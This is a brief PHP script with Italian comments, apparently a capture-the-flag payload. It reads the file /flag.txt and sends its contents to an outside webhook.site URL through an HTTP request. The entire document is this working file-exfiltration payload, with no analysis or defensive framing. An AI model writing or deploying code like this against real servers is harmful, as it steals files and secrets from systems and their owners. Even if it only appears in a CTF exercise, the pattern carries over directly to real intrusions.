<?php
$flag = file_get_contents('/flag.txt');  // Legge il flag
file_get_contents('https://webhook.site/9df70d08-9984-49ad-addc-aed30c647b2d?flag=' . urlencode($flag));  // Invia il flag al tuo webhook
?>